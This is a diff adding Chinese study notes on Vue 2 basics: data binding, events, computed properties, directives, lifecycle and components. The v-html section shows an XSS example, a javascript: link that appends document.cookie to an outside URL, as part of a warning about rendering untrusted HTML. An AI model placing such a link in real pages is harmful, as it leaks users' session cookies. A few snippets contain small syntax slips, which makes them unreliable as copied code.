@@ -1,0 +1,791 @@
+# 一、Vue介绍
+## 1、介绍
+### （1）描述
+Vue是动态构建用户界面的渐进式 JavaScript 框架
+
+### （2）特点
+
+1. 遵循 MVVM 模式
+2. 编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发
+3. 它本身只关注 UI, 也可以引入其它第三方库开发项目
+
+## 2、总结
+
+1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
+2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
+3. root容器里的代码被称为【Vue模板】；
+4. Vue实例和容器是一一对应的；
+5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
+6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
+```
+注意区分：js表达式 和 js代码(语句)
+1. 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
+    (1). a
+	(2). a+b
+	(3). demo(1)  代码表达式
+	(4). x === y ? 'a' : 'b' 三目表达式
+
+2.js代码(语句)
+	(1). if(){}
+	(2). for(){}
+```
+7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
+
+例子：
+```
+    <div id="root">
+        <!-- 准备好一个容器 -->
+        <h1>hello,{{name}}</h1>
+    </div>
+
+    <script type="text/javascript">
+    Vue.config.productionTip = false  //阻止vue在启动时生成生产提示
+    const x = new Vue({
+        el:'#root', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
+        data:{ //data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
+            name:'zjx'
+        }
+    })
+```
+
+## 2、Vue模板语法
+### （1）插值语法：例子中的{{name}}
+功能：用于解析标签体内容。
+写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性
+
+### （2）指令语法
+功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
+
+```
+举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性
+这里的v-bind是把""里面的东西当成js表达式
+其中v-bind: 可以简写为 :
+例如：
+<a v-bind:href="url">点我去学习1</a> 可以等于
+<a :href="url">点我去学习2</a>
+```
+备注：Vue中有很多的指令，且形式都是：v-????
+
+## 3、数据绑定
+Vue中有2种数据绑定的方式：
+### （1）单向绑定(v-bind)
+数据只能从data流向页面
+
+### （2）双向绑定(v-model)
+数据不仅能从data流向页面，还可以从页面流向data
+
+备注：
+1. 双向绑定一般都应用在表单类元素的value值上（如：input、select等）
+2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值
+```
+<!-- 普通写法 -->
+<!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
+双向数据绑定：<input type="text" v-model:value="name"><br/> -->
+
+<!-- 简写 -->
+单向数据绑定：<input type="text" :value="name"><br/>
+双向数据绑定：<input type="text" v-model="name"><br/>
+```
+
+## 4、el和data的两种写法
+
+1. el有2种写法
+    (1)new Vue时候配置el属性。
+    (2)先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
+2. data有2种写法
+(1)对象式
+(2)函数式
+
+如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错
+
+3. 一个重要的原则：
+由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了
+
+
+```
+		//el的两种写法
+		/* const v = new Vue({
+			//el:'#root', //第一种写法
+			data:{
+				name:'尚硅谷'
+			}
+		})
+		console.log(v)
+		v.$mount('#root') //第二种写法 */
+
+		//data的两种写法
+		new Vue({
+			el:'#root',
+			//data的第一种写法：对象式
+			/* data:{
+				name:'尚硅谷'
+			} */
+
+			//data的第二种写法：函数式
+			data(){
+				console.log('@@@',this) //此处的this是Vue实例对象
+				return{
+					name:'尚硅谷'
+				}
+			}
+```
+
+## 5、MVVM模型
+        1. M：模型(Model) ：data中的数据
+                2. V：视图(View) ：模板代码
+                3. VM：视图模型(ViewModel)：Vue实例
+
+观察发现：
+        1. data中所有的属性，最后都出现在了vm身上
+        2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用
+
+## 6、数据代理
+数据代理：就是通过一个对象代理对另一个对象中属性的操作（读/写）
+
+1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
+2. Vue中数据代理的好处：更加方便的操作data中的数据
+3. 基本原理：
+通过Object.defineProperty()把data对象中所有属性添加到vm上
+为每一个添加到vm上的属性，都指定一个getter/setter
+在getter/setter内部去操作（读/写）data中对应的属性
+
+## 7、事件代理
+### （1）事件的基本使用：
+
+1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
+例如v-on:click= "showInfo" 也可以写成@click = "showInfo"
+2. 事件的回调需要配置在methods对象中，最终会在vm上；
+```
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+			},
+			methods:{
+				showInfo1(event){
+					// console.log(event.target.innerText)
+					// console.log(this) //此处的this是vm
+					alert('同学你好！')
+				},
+				showInfo2(event,number){
+					console.log(event,number)
+					// console.log(event.target.innerText)
+					// console.log(this) //此处的this是vm
+					alert('同学你好！！')
+				}
+			}
+		})
+```
+3. methods中配置的函数，不要用箭头函数！否则this就不是vm了；
+4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
+5. @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
+
+### （2）事件修饰符
+
+1. prevent：阻止默认事件（常用）；
+```
+<div id="root">
+	<h2>欢迎来到{{name}}学习</h2>
+	<!-- 阻止默认事件（常用） -->
+	<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>
+</div>
+```
+2. stop：阻止事件冒泡（常用）；
+3. once：事件只触发一次（常用）；
+4. capture：使用事件的捕获模式；
+5. self：只有event.target是当前操作的元素时才触发事件；
+6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
+
+### （3）键盘事件
+
+1. Vue中常用的按键别名：
+回车 => enter
+删除 => delete (捕获“删除”和“退格”键)
+退出 => esc
+空格 => space
+换行 => tab (特殊，必须配合keydown去使用)
+上 => up
+下 => down
+左 => left
+右 => right
+```
+		<div id="root">
+			<h2>欢迎来到{{name}}学习</h2>
+			<input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
+		</div>
+```
+2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
+
+3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta
+(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
+(2).配合keydown使用：正常触发事件。
+
+4. 也可以使用keyCode去指定具体的按键（不推荐）
+
+5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
+
+## 8、计算属性
+### （1）完整写法
+
+1. 定义：要用的属性不存在，要通过已有属性计算得来。
+2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
+3. get函数什么时候执行？
+(1).初次读取时会执行一次。
+(2).当依赖的数据发生改变时会被再次调用。
+4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
+5. 备注：
+(1)计算属性最终会出现在vm上，直接读取使用即可。
+(2)如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变
+
+### （2）简写模式
+只能用于只有get没有set的情况（只读不改）
+把fullname当成一个函数,里面的内容就是getter的内容，函数名就是计算名，函数内容就是计算内容
+
+```
+fullName(){
+	console.log('get被调用了')
+	return this.firstName + '-' + this.lastName
+	}
+SS}
+```
+
+## 9、监视属性
+### （1）总结：
+监视属性watch：
+
+1. 当被监视的属性变化时, 回调函数(handler)自动调用, 进行相关操作
+2. 监视的属性必须存在，才能进行监视！！
+3. 监视的两种写法：
+		(1).new Vue时传入watch配置
+		(2).通过vm.$watch监视
+
+```
+写法1：
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				isHot:true,
+			},
+			computed:{
+				info(){
+					return this.isHot ? '炎热' : '凉爽'
+				}
+			}
+
+写法2：
+		vm.$watch('isHot',{
+			immediate:true, //初始化时让handler调用一下
+			//handler什么时候调用？当isHot发生改变时。
+			handler(newValue,oldValue){
+				console.log('isHot被修改了',newValue,oldValue)
+			}
+		})
+```
+
+## 10、监听属性和计算属性区别
+监听属性可以开启异步任务(例如定时器)，但是计算属性不能
+
+区别：
+1. computed能完成的功能，watch都可以完成。
+2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
+
+
+两个重要的小原则：
+1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
+2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象
+
+
+# 二、绑定样式
+要把需要绑定的东西放在v-bind中，也就是:中，作为指令语法把里面更改的内容认为js表达式
+（不变化的正常写，变化的交给vue处理-->  :class/:style）
+## 1、绑定class样式
+### （1）字符串写法
+适用于：样式的类名不确定，需要动态指定
+
+```
+<div class="basic" :class="mood" @click="changeMood">{{name}}</div>
+
+
+const vm = new Vue({
+	el: 'root',
+	data: {
+
+	},
+	methods: {
+		changeMood(){
+			const arr = ['happy','sad','normal']
+			const index = Math.floor(Math.random()*3)  //随机生成序列号(0,1,2)
+			this.mood = arr[index]
+	}
+}
+)
+```
+
+### （2）数组写法
+适用于：要绑定的样式个数不确定、名字也不确定
+
+```
+<div class="basic" :class="classArr">{{name}}</div> <br/><br/>
+
+const vm = new Vue({
+	el:'#root',
+	data:{
+		name:'尚硅谷',
+		mood:'normal',
+		classArr:['atguigu1','atguigu2','atguigu3']
+```
+
+### （3）对象写法
+适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用
+
+```
+<div class="basic" :class="classObj">{{name}}</div> <br/><br/>
+
+const vm = new Vue({
+	el:'#root',
+	data:{
+		name:'尚硅谷',
+		mood:'normal',
+		classObj:{
+			atguigu1:false,
+			atguigu2:false,  //通过更改两者的false和true实现四种情况
+		}
+```
+
+## 2、绑定style样式
+### （1）对象写法(常用)
+对象名不能乱写，应该用存在的对应名字的驼峰命名对应
+
+```
+<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
+
+const vm = new Vue({
+	el:'#root',
+	data:{
+		name:'尚硅谷',
+		styleObj:{
+			fontSize: '40px',
+			color:'red',
+		}
+```
+
+### （2）数组写法(不常用)
+
+```
+<div class="basic" :style="styleArr">{{name}}</div> <br/><br/>
+
+const vm = new Vue({
+	el:'#root',
+	data:{
+		name:'尚硅谷',
+		styleObj:{
+			fontSize: '40px',
+			color:'red',
+		},
+		styleObj2:{
+			backgroundColor:'orange'
+		},
+		styleArr:[
+		{
+			fontSize: '40px',
+			color:'blue',
+		},
+		{
+		backgroundColor:'gray'
+		}
+]
+}
+```
+
+## 3、总结
+绑定样式：
+
+1. class样式
+	写法:class="xxx" xxx可以是字符串、对象、数组
+			字符串写法适用于：类名不确定，要动态获取。
+			对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
+			数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用
+
+2. style样式
+	:style="{fontSize: xxx}"其中xxx是动态值。
+	:style="[a,b]"其中a、b是样式对象。
+
+# 三、渲染
+## 1、条件渲染
+### （1）v-if
+```
+<!-- 使用v-if做条件渲染 -->
+	<h2 v-if="false">欢迎来到{{name}}</h2> //false不出现在页面
+	<h2 v-if="1 === 1">欢迎来到{{name}}</h2> //里面可以写表达式，出现在页面
+```
+也可以用if-else和v-else-if
+```
+<!-- v-else和v-else-if -->
+<div v-if="n === 1">Angular</div>
+<div v-else-if="n === 2">React</div>
+<div v-else-if="n === 3">Vue</div>
+<div v-else>哈哈</div>
+```
+### （2）v-show
+```
+<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
+<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->
+```
+
+### （3）总结
+条件渲染：
+1. v-if
+		(1).v-if="表达式"
+		(2).v-else-if="表达式"
+		(3).v-else="表达式"
+
+	适用于：切换频率较低的场景。
+	特点：不展示的DOM元素直接被移除。
+	注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
+
+2. v-show
+	写法：v-show="表达式"
+	适用于：切换频率较高的场景。
+	特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
+
+3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show则一定可以获取到，因为v-if是直接删除结点，而v-show只是隐藏内容而没有删除节点
+
+## 2、列表渲染
+v-for指令:
+1. 用于展示列表数据
+2. 语法：v-for="(item, index) in xxx" :key="yyy"
+3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
+
+### （1）遍历数组
+```
+<ul>
+	<li v-for="(p,index) of persons" :key="index">
+	//p是遍历的内容就是persons[0]，index是遍历的序号
+		{{p.name}}-{{p.age}}
+	</li>
+</ul>
+
+new Vue({
+	el:'#root',
+	data:{
+		persons:[
+			{id:'001',name:'张三',age:18},
+			{id:'002',name:'李四',age:19},
+			{id:'003',name:'王五',age:20}
+		]
+```
+
+### （2）遍历对象
+```
+<h2>汽车信息（遍历对象）</h2>
+<ul>
+	<li v-for="(value,k) of car" :key="k">
+		{{k}}-{{value}}
+	</li>
+</ul>
+
+new Vue({
+	el:'#root',
+	data:{
+	car:{
+		name:'奥迪A8',
+		price:'70万',
+		color:'黑色'
+	}
+	}
+```
+
+### （3）具体说明
+面试题：react、vue中的key有什么作用？（key的内部原理）
+
+1. 虚拟DOM中key的作用：
+		key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
+	
+2. 对比规则：
+	(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
+				①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
+				②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
+
+	(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
+				创建新的真实DOM，随后渲染到到页面。
+	
+3. 用index作为key可能会引发的问题：
+	1.若对数据进行：逆序添加、逆序删除等破坏顺序操作:会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
+
+	2.如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。
+
+4. 开发中如何选择key?:
+			1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
+			2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
+				使用index作为key是没有问题的
+
+
+#四、数据监测
+Vue监视数据的原理：
+
+1. vue会监视data中所有层次的数据
+
+   
+
+2. 如何监测对象中的数据？
+	通过setter实现监视，且要在new Vue时就传入要监测的数据。
+		(1).对象中后追加的属性，Vue默认不做响应式处理
+		(2).如需给后添加的属性做响应式，请使用如下API：需要使用set
+						Vue.set(target，propertyName/index，value) 或 
+						vm.$set(target，propertyName/index，value)
+
+	给目标target追加一个属性propetry，值为value	
+	
+	
+	
+3. 如何监测数组中的数据？
+		通过包裹数组更新元素的方法实现，本质就是做了两件事：
+			(1).调用原生对应的方法对数组进行更新。
+			(2).重新解析模板，进而更新页面。
+
+4.在Vue修改数组中的某个元素一定要用如下方法：
+
+​	(1) 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+
+​	(2) Vue.set() 或 vm.$set()
+
+特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象(_data) 添加属性！！
+
+数据劫持：把原本的data数据变为由set监控的_data数据形式
+
+# 五、表单数据
+## 1、收集表单数据：
+
+	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值
+	也就是如果是输入文本框就直接使用v-model双向收集，收集到value值
+```
+密码：<input type="password" v-model="userInfo.password"> 
+```
+	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值
+	也就是当是单选框时，需要配置value
+	
+	若：<input type="checkbox"/>
+		1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+		-->也就是当多选框/选择框没有配置value时，返回的时勾选状态
+		
+		2.配置input的value属性:
+				(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）-->单选
+				(2)v-model的初始值是数组，那么收集的的就是value组成的数组-->多选
+	
+	备注：v-model的三个修饰符：
+					lazy：失去焦点再收集数据
+					number：输入字符串转为有效的数字
+					trim：输入首尾空格过滤
+
+
+## 2、过滤器
+		定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
+		语法：
+			1.注册过滤器：Vue.filter(name,callback)-->全局 或 new Vue{filters:{}}
+			2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
+		
+		备注：
+				1.过滤器也可以接收额外参数、多个过滤器也可以串联
+				2.并没有改变原本的数据, 是产生新的对应的数据
+
+# 六、指令
+## 1、总结
+			v-bind	: 单向绑定解析表达式, 可简写为 :xxx
+			v-model	: 双向数据绑定
+			v-for  	: 遍历数组/对象/字符串
+			v-on   	: 绑定事件监听, 可简写为@
+			v-if 	: 条件渲染（动态控制节点是否存存在）
+			v-else 	: 条件渲染（动态控制节点是否存存在）
+			v-show 	: 条件渲染 (动态控制节点是否展示)
+			v-text  ：向其所在的节点中渲染文本内容
+			v-html  : 向指定节点中渲染包含html结构的内容（和v-text相似但能解析结构）
+			v-cloak : 特殊属性，没有值，可以配合CSS样式解决因网速出现的页面标签问题
+			v-once  ：所在节点在初次渲染后就视为静态内容
+			v-pre   : 跳过其所在节点的编译过程
+
+
+## 2、内置指令
+### （1）v-text
+作用： 向其所在的节点中渲染文本内容。
+2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会
+```
+<div>你好，{{name}}</div>
+<div v-text="name"></div>
+
+new Vue({
+	el:'#root',
+	data:{
+		name:'尚硅谷',
+	}
+})
+```
+
+### （2）v-html
+作用：向指定节点中渲染包含html结构的内容
+
+1. 与插值语法的区别：
+			(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+			(2).v-html可以识别html结构
+
+2. 严重注意：v-html有安全性问题
+			(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+			(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+
+```
+	<div v-html="str"></div>
+	<div v-html="str2"></div>
+
+new Vue({
+	el:'#root',
+	data:{
+		str:'<h3>你好啊！</h3>',
+		str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'}
+		})
+```
+
+### （3）v-cloak
+1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
+2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题
+```
+<h2 v-cloak>{{name}}</h2>
+
+<style>
+	[v-cloak]{
+		display:none;
+	}
+</style>
+```
+### （4）v-once
+1. v-once所在节点在初次动态渲染后，就视为静态内容了
+2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
+相当于写上v-once后保存初始值
+
+### （5）v-pre
+1. 跳过其所在节点的编译过程。
+2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译
+
+
+## 3、自定义指令
+### （1）语法范围
+1. 局部指令：
+		new Vue({directives:{指令名:配置对象}) 或 new Vie({directives{指令名:回调函数}})
+2. 全局指令：
+			Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
+```
+//全局指令
+Vue.directive('fbind',{
+			//指令与元素成功绑定时（一上来）
+			bind(element,binding){
+				element.value = binding.value
+			},
+			//指令所在元素被插入页面时
+			inserted(element,binding){
+				element.focus()
+			},
+			//指令所在的模板被重新解析时
+			update(element,binding){
+				element.value = binding.value
+			}
+		}) 
+```
+自定义指令会传入element和binding，其中element是真实的DOM元素，binding是给定的对象的一系列属性
+
+### （2）配置对象中常用的3个回调：
+1. bind：指令与元素成功绑定时调用。
+2. inserted：指令所在元素被插入页面时调用。
+3. update：指令所在模板结构被重新解析时调用。
+
+### （3）备注
+1. 指令定义时不加v-，但使用时要加v-；
+2. 指令名如果是多个单词，要使用kebab-case命名方式(就是两个单词使用连号符连接，例如big-number)，不要用小驼峰命名
+
+# 七、生命周期
+![节点](./image/生命周期.png)
+总结：
+常用的生命周期钩子：
+1. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
+2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
+
+关于销毁Vue实例
+1. 销毁后借助Vue开发者工具看不到任何信息。
+2. 销毁后自定义事件会失效，但原生DOM事件依然有效。
+3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
+
+
+# 八、组件
+传统方式存在的问题：
+1. 依赖关系混乱，不好维护
+2. 代码复用率不高(HTML没有复用)
+
+## 1、非单文件组件
+#### （1）Vue中使用组件的三大步骤：
+1. 定义组件(创建组件)
+2. 注册组件
+3. 使用组件(写组件标签)
+
+#### （2）如何定义一个组件
+使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
+1. el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
+2. data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
+备注：使用template可以配置组件结构。
+
+#### （3）如何注册组件
+1. 局部注册：靠new Vue的时候传入components选项
+2. 全局注册：靠Vue.component('组件名',组件)
+
+#### （4）编写组件标签：
+	<school></school>
+
+### 2、注意点
+关于组件名:
+1. 一个单词组成：
+			第一种写法(首字母小写)：school
+			第二种写法(首字母大写)：School
+
+2. 多个单词组成：
+			第一种写法(kebab-case命名)：my-school
+			第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
+3. 备注
+		(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
+		(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
+
+关于组件标签:
+1. 第一种写法：<school></school>
+2. 第二种写法：<school/>
+备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
+
+一个简写方式：
+const school = Vue.extend(options) 可简写为：const school = options
+```
+const school = (){}
+```
+
+### 3、VueComponent
+1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
+
+```
+2. 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象
+即Vue帮我们执行的：new VueComponent(options)
+```
+
+3. 特别注意：每次调用Vue.extend，返回的都是一个**全新**的VueComponent
+
+4. 关于this指向：
+
+(1)组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】
+
+（2）new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】
+
+5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
+	Vue的实例对象，以后简称vm
+
+
+### 4、重要的内置关系
+实例对象的隐式原型 = 函数的显示原型
+```
+VueComponent.prototype.__proto__ === Vue.prototype
+```
+为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法
+![节点](./image/Vue与VueComponent.png)
+
+## 2、单文件组件
